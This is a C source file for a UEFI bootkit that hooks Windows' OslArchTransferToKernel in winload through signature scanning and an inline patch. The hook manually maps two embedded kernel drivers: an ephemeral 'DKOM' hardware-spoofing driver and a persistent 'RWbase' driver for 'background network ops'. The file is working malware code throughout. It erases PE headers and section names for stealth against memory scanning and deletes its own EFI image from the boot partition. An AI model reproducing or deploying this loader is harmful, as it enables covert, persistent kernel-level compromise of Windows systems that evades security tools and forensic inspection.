/**
 * OslTransferHook.c - OslArchTransferToKernel Hook Implementation
 * 
 * Dual-driver loading sequence:
 * 1. DKOM.sys - Execute and erase (ephemeral hardware spoofing)
 * 2. RWbase.sys - Map persistently (background network ops)
 */

#include "OslTransferHook.h"
#include "SelfDelete.h"
#include <Library/BaseMemoryLib.h>

//
// Embedded driver binaries (generated by bin2header.py)
// These will be created during build process
//
#define EFIGUARD_EMBED_DRIVERS
#ifdef EFIGUARD_EMBED_DRIVERS
#include "DKOM_bin.h"
#include "RWbase_bin.h"
#else
// Placeholder for development - will be replaced with actual data
STATIC CONST UINT8 DKOM_RawData[] = { 0 };
STATIC CONST UINT32 DKOM_RawDataSize = 0;
STATIC CONST UINT8 RWbase_RawData[] = { 0 };
STATIC CONST UINT32 RWbase_RawDataSize = 0;
#endif

//
// Global variables for assembly stub access
//
UINT64 G_SavedRax_Temp = 0;
UINT8* gOriginalTransferAddr = NULL;

//
// Internal mapping context
//
STATIC MAPPING_CONTEXT gMapCtx = {0};

//
// Primary signature for OslArchTransferToKernel (Windows 10 20H1+, no KVA Shadow)
// Pattern: mov rcx, rax; mov cr3, rax; ...; jmp rdx
//
STATIC CONST UINT8 SigOslArchTransferPrimary[] = {
    0x48, 0x8B, 0xC8,           // mov rcx, rax
    0x0F, 0x22, 0xD8,           // mov cr3, rax  <-- Critical point
    0xCC, 0xCC,                 // (variable padding/nops)
    0xFF, 0xE2                  // jmp rdx
};

//
// Fallback signature (more permissive matching)
//
STATIC CONST UINT8 SigOslArchTransferFallback[] = {
    0x0F, 0x22, 0xD8,           // mov cr3, rax
    0xCC, 0xCC, 0xCC, 0xCC,     // (variable)
    0xFF, 0xE2                  // jmp rdx
};

//
// Find ntoskrnl.exe base address from LoaderBlock
//
STATIC
UINT8*
EFIAPI
FindNtoskrnlBase(
    IN PLOADER_PARAMETER_BLOCK LoaderBlock
    )
{
    if (LoaderBlock == NULL)
        return NULL;

    PLIST_ENTRY Head = &LoaderBlock->LoadOrderListHead;
    for (PLIST_ENTRY Entry = Head->Flink; Entry != Head; Entry = Entry->Flink)
    {
        PKLDR_DATA_TABLE_ENTRY Module = CONTAINING_RECORD(
            Entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        if (Module->BaseDllName.Buffer != NULL)
        {
            // Check for ntoskrnl variants
            if (StriStr(Module->BaseDllName.Buffer, L"ntoskrnl") != NULL ||
                StriStr(Module->BaseDllName.Buffer, L"ntkrnlmp") != NULL ||
                StriStr(Module->BaseDllName.Buffer, L"ntkrnlpa") != NULL)
            {
                return (UINT8*)Module->DllBase;
            }
        }
    }
    return NULL;
}

//
// Process base relocations for manual mapping
//
EFI_STATUS
EFIAPI
ProcessRelocations(
    IN UINT8* ImageBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders,
    IN INT64 Delta
    )
{
    if (Delta == 0)
        return EFI_SUCCESS;
    
    PEFI_IMAGE_DATA_DIRECTORY RelocDir = 
        &NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (RelocDir->VirtualAddress == 0 || RelocDir->Size == 0)
        return EFI_SUCCESS;
    
    PIMAGE_BASE_RELOCATION Reloc = 
        (PIMAGE_BASE_RELOCATION)(ImageBase + RelocDir->VirtualAddress);
    UINT8* RelocEnd = (UINT8*)Reloc + RelocDir->Size;
    
    while ((UINT8*)Reloc < RelocEnd && Reloc->SizeOfBlock > 0)
    {
        UINT32 Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(UINT16);
        UINT16* Entry = (UINT16*)((UINT8*)Reloc + sizeof(IMAGE_BASE_RELOCATION));
        
        for (UINT32 i = 0; i < Count; i++)
        {
            UINT16 Type = Entry[i] >> 12;
            UINT16 Offset = Entry[i] & 0xFFF;
            
            if (Type == EFI_IMAGE_REL_BASED_DIR64)
            {
                UINT64* Target = (UINT64*)(ImageBase + Reloc->VirtualAddress + Offset);
                *Target += Delta;
            }
            else if (Type == EFI_IMAGE_REL_BASED_HIGHLOW)
            {
                UINT32* Target = (UINT32*)(ImageBase + Reloc->VirtualAddress + Offset);
                *Target += (UINT32)Delta;
            }
            // EFI_IMAGE_REL_BASED_ABSOLUTE (0) is padding, ignore
        }
        
        Reloc = (PIMAGE_BASE_RELOCATION)((UINT8*)Reloc + Reloc->SizeOfBlock);
    }
    
    return EFI_SUCCESS;
}

//
// Resolve imports from ntoskrnl.exe
//
EFI_STATUS
EFIAPI
ResolveImportsFromKernel(
    IN UINT8* ImageBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders,
    IN MAPPING_CONTEXT* Ctx
    )
{
    PEFI_IMAGE_DATA_DIRECTORY ImportDir = 
        &NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (ImportDir->VirtualAddress == 0 || ImportDir->Size == 0)
        return EFI_SUCCESS;
    
    PIMAGE_IMPORT_DESCRIPTOR Import = 
        (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + ImportDir->VirtualAddress);
    
    while (Import->Name != 0)
    {
        CHAR8* DllName = (CHAR8*)(ImageBase + Import->Name);
        
        // Resolve from ntoskrnl for kernel imports
        UINT8* ResolveBase = NULL;
        PEFI_IMAGE_NT_HEADERS ResolveNtHdr = NULL;
        
        if (AsciiStriCmp(DllName, "ntoskrnl.exe") == 0 ||
            AsciiStriCmp(DllName, "ntkrnlpa.exe") == 0 ||
            AsciiStriCmp(DllName, "ntkrnlmp.exe") == 0 ||
            AsciiStriCmp(DllName, "HAL.dll") == 0)
        {
            ResolveBase = Ctx->NtoskrnlBase;
            ResolveNtHdr = Ctx->NtoskrnlNtHeaders;
        }
        
        if (ResolveBase != NULL && ResolveNtHdr != NULL)
        {
            UINT64* Thunk = (UINT64*)(ImageBase + Import->FirstThunk);
            UINT64* OrigThunk = Import->u.OriginalFirstThunk ? 
                (UINT64*)(ImageBase + Import->u.OriginalFirstThunk) : Thunk;
            
            while (*OrigThunk != 0)
            {
                // Check if import by name (not ordinal)
                if (!(*OrigThunk & IMAGE_ORDINAL_FLAG64))
                {
                    PIMAGE_IMPORT_BY_NAME ByName = 
                        (PIMAGE_IMPORT_BY_NAME)(ImageBase + (UINT32)*OrigThunk);
                    
                    VOID* Proc = GetProcedureAddress(
                        (UINTN)ResolveBase, 
                        ResolveNtHdr, 
                        (CONST CHAR8*)ByName->Name);
                    
                    if (Proc != NULL)
                    {
                        *Thunk = (UINT64)Proc;
                    }
                }
                
                Thunk++;
                OrigThunk++;
            }
        }
        
        Import++;
    }
    
    return EFI_SUCCESS;
}

//
// Map and execute a driver with manual mapping
//
EFI_STATUS
EFIAPI
MapAndExecuteDriver(
    IN CONST UINT8* DriverRawData,
    IN UINT32 DriverSize,
    IN OUT MAPPING_CONTEXT* Ctx,
    IN BOOLEAN EraseAfterExec
    )
{
    if (DriverRawData == NULL || DriverSize == 0)
        return EFI_INVALID_PARAMETER;
    
    // Parse PE headers
    PEFI_IMAGE_NT_HEADERS NtHdr = RtlpImageNtHeaderEx(DriverRawData, DriverSize);
    if (NtHdr == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Invalid PE header in driver image\r\n");
        return EFI_INVALID_PARAMETER;
    }
    
    UINT32 ImageSize = NtHdr->OptionalHeader.SizeOfImage;
    
    // Allocate kernel memory (EfiRuntimeServicesCode survives ExitBootServices)
    EFI_PHYSICAL_ADDRESS PhysAddr = 0;
    EFI_STATUS Status = gBS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesCode,
        EFI_SIZE_TO_PAGES(ImageSize),
        &PhysAddr);
    
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Failed to allocate %u bytes: %r\r\n", ImageSize, Status);
        return Status;
    }
    
    UINT8* MappedBase = (UINT8*)PhysAddr;
    SetMem(MappedBase, ImageSize, 0);
    
    // Copy PE headers
    CopyMem(MappedBase, DriverRawData, NtHdr->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHdr);
    for (UINT16 i = 0; i < NtHdr->FileHeader.NumberOfSections; i++)
    {
        if (Section[i].SizeOfRawData > 0)
        {
            CopyMem(
                MappedBase + Section[i].VirtualAddress,
                DriverRawData + Section[i].PointerToRawData,
                Section[i].SizeOfRawData);
        }
    }
    
    // Get NT headers from mapped image
    PEFI_IMAGE_NT_HEADERS MappedNtHdr = RtlpImageNtHeaderEx(MappedBase, ImageSize);
    
    // Process relocations
    INT64 Delta = (INT64)MappedBase - (INT64)NtHdr->OptionalHeader.ImageBase;
    Status = ProcessRelocations(MappedBase, MappedNtHdr, Delta);
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Relocation processing failed: %r\r\n", Status);
        goto Cleanup;
    }
    
    // Resolve imports from ntoskrnl
    Status = ResolveImportsFromKernel(MappedBase, MappedNtHdr, Ctx);
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Import resolution failed: %r\r\n", Status);
        goto Cleanup;
    }
    
    // Wipe PE headers for stealth
    SetMem(MappedBase, MappedNtHdr->OptionalHeader.SizeOfHeaders, 0);
    
    PRINT_KERNEL_PATCH_MSG(L"[+] Driver mapped at 0x%p, calling entry...\r\n", MappedBase);
    
    // Call driver entry point
    typedef NTSTATUS (NTAPI *DRIVER_ENTRY_FN)(VOID* DriverObject, VOID* RegistryPath);
    DRIVER_ENTRY_FN DriverEntry = (DRIVER_ENTRY_FN)(
        MappedBase + NtHdr->OptionalHeader.AddressOfEntryPoint);
    
    // Execute driver entry (NULL params for manual mapping)
    NTSTATUS NtStatus = DriverEntry(NULL, NULL);
    PRINT_KERNEL_PATCH_MSG(L"[+] Driver entry returned: 0x%08X\r\n", NtStatus);
    
    // Ephemeral drivers: erase immediately after execution
    if (EraseAfterExec)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Erasing ephemeral driver memory...\r\n");
        SetMem(MappedBase, ImageSize, 0);
        gBS->FreePages(PhysAddr, EFI_SIZE_TO_PAGES(ImageSize));
        MappedBase = NULL;
    }
    else
    {
        // Persistent driver: store base address
        Ctx->RWbaseMappedBase = MappedBase;
        
        // Erase section names to prevent memory string scanning
        PEFI_IMAGE_SECTION_HEADER MappedSection = IMAGE_FIRST_SECTION(
            RtlpImageNtHeaderEx(DriverRawData, DriverSize));
        UINT8* SectionHeaderBase = MappedBase + 
            ((UINT8*)MappedSection - DriverRawData);
        for (UINT16 i = 0; i < NtHdr->FileHeader.NumberOfSections; i++)
        {
            // Zero out section name (.text, .data, .rdata, etc.)
            SetMem(SectionHeaderBase + (i * sizeof(EFI_IMAGE_SECTION_HEADER)), 8, 0);
        }
        PRINT_KERNEL_PATCH_MSG(L"[+] Section names erased for stealth\\r\\n");
    }
    
    return EFI_SUCCESS;

Cleanup:
    if (PhysAddr != 0)
    {
        SetMem(MappedBase, ImageSize, 0);
        gBS->FreePages(PhysAddr, EFI_SIZE_TO_PAGES(ImageSize));
    }
    return Status;
}

//
// Main hook handler - dual driver loading sequence
//
EFI_STATUS
EFIAPI
HookedOslArchTransfer(
    IN UINT64 LoaderBlock,
    IN UINT64 KernelEntry,
    IN UINT64 SavedRax
    )
{
    // Store critical register values
    gMapCtx.SavedRax = SavedRax;
    gMapCtx.LoaderBlock = LoaderBlock;
    gMapCtx.KernelEntry = KernelEntry;
    
    PRINT_KERNEL_PATCH_MSG(L"\r\n[OslTransferHook] SavedRax=0x%llX, LoaderBlock=0x%llX, Entry=0x%llX\r\n",
        SavedRax, LoaderBlock, KernelEntry);
    
    // Step 1: Locate ntoskrnl.exe from LoaderBlock
    gMapCtx.NtoskrnlBase = FindNtoskrnlBase((PLOADER_PARAMETER_BLOCK)LoaderBlock);
    if (gMapCtx.NtoskrnlBase == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Failed to locate ntoskrnl.exe in LoaderBlock\r\n");
        goto Exit;
    }
    
    gMapCtx.NtoskrnlNtHeaders = RtlpImageNtHeaderEx(gMapCtx.NtoskrnlBase, 0);
    PRINT_KERNEL_PATCH_MSG(L"[+] ntoskrnl.exe found at 0x%p\r\n", gMapCtx.NtoskrnlBase);
    
#ifdef EFIGUARD_EMBED_DRIVERS
    // Step 2: Load DKOM (ephemeral - execute and erase)
    if (DKOM_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping DKOM.sys (%u bytes, ephemeral)...\r\n", DKOM_RawDataSize);
        EFI_STATUS Status = MapAndExecuteDriver(DKOM_RawData, DKOM_RawDataSize, &gMapCtx, TRUE);
        if (EFI_ERROR(Status))
        {
            PRINT_KERNEL_PATCH_MSG(L"[!] DKOM mapping failed: %r\r\n", Status);
        }
    }
    
    // Step 3: Load RWbase (persistent - stays in memory)
    if (RWbase_RawDataSize > 0)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Mapping RWbase.sys (%u bytes, persistent)...\r\n", RWbase_RawDataSize);
        EFI_STATUS Status = MapAndExecuteDriver(RWbase_RawData, RWbase_RawDataSize, &gMapCtx, FALSE);
        if (EFI_ERROR(Status))
        {
            PRINT_KERNEL_PATCH_MSG(L"[!] RWbase mapping failed: %r\r\n", Status);
        }
    }
#else
    PRINT_KERNEL_PATCH_MSG(L"[!] No embedded drivers (EFIGUARD_EMBED_DRIVERS not defined)\r\n");
#endif

    // Step 4: Self-delete EFI from ESP (after ExitBootServices, before kernel jump)
    // This is the safe window: firmware FS driver still available, Windows not yet in control
#ifdef EFIGUARD_SELF_DELETE
    extern EFI_HANDLE gEfiGuardImageHandle;
    if (gEfiGuardImageHandle != NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[+] Deleting self from ESP...\r\n");
        DeleteSelfFromDisk(gEfiGuardImageHandle);
    }
#endif

Exit:
    // Store SavedRax for assembly stub to restore
    G_SavedRax_Temp = SavedRax;
    
    return EFI_SUCCESS;
}

//
// Install hook on OslArchTransferToKernel
//
EFI_STATUS
EFIAPI
HookOslArchTransfer(
    IN CONST UINT8* WinloadBase,
    IN PEFI_IMAGE_NT_HEADERS NtHeaders
    )
{
    if (WinloadBase == NULL || NtHeaders == NULL)
        return EFI_INVALID_PARAMETER;
    
    // Find .text section
    PEFI_IMAGE_SECTION_HEADER TextSection = NULL;
    PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
    
    for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (AsciiStrnCmp((CHAR8*)Section[i].Name, ".text", 5) == 0)
        {
            TextSection = &Section[i];
            break;
        }
    }
    
    if (TextSection == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] .text section not found in winload\r\n");
        return EFI_NOT_FOUND;
    }
    
    CONST UINT8* SearchBase = WinloadBase + TextSection->VirtualAddress;
    UINT32 SearchSize = TextSection->Misc.VirtualSize;
    
    // Try primary signature first
    VOID* Found = NULL;
    EFI_STATUS Status = FindPattern(
        SigOslArchTransferPrimary,
        0xCC,
        sizeof(SigOslArchTransferPrimary),
        SearchBase,
        SearchSize,
        &Found);
    
    // Fall back to secondary signature if primary fails
    if (EFI_ERROR(Status))
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Primary signature not found, trying fallback...\r\n");
        Status = FindPattern(
            SigOslArchTransferFallback,
            0xCC,
            sizeof(SigOslArchTransferFallback),
            SearchBase,
            SearchSize,
            &Found);
    }
    
    if (EFI_ERROR(Status) || Found == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] OslArchTransferToKernel not found\r\n");
        return EFI_NOT_FOUND;
    }
    
    // Back up to function start using unwind data
    UINT8* FunctionStart = FindFunctionStart(WinloadBase, NtHeaders, Found);
    if (FunctionStart == NULL)
    {
        PRINT_KERNEL_PATCH_MSG(L"[!] Could not find function start, using pattern match\r\n");
        FunctionStart = (UINT8*)Found;
    }
    
    PRINT_KERNEL_PATCH_MSG(L"[+] OslArchTransferToKernel at 0x%p (function start: 0x%p)\r\n", 
        Found, FunctionStart);
    
    // Store original address for stub to jump back to
    gOriginalTransferAddr = FunctionStart;
    
    // Install inline hook (same template as EfiGuard uses)
    UINT8 HookBytes[sizeof(gHookTemplate)];
    CopyMem(HookBytes, gHookTemplate, sizeof(gHookTemplate));
    *(VOID**)(&HookBytes[gHookTemplateAddressOffset]) = (VOID*)TransferEntryStub;
    
    CopyWpMem(FunctionStart, HookBytes, sizeof(HookBytes));
    
    PRINT_KERNEL_PATCH_MSG(L"[+] Hook installed, redirecting to 0x%p\r\n", TransferEntryStub);
    
    return EFI_SUCCESS;
}
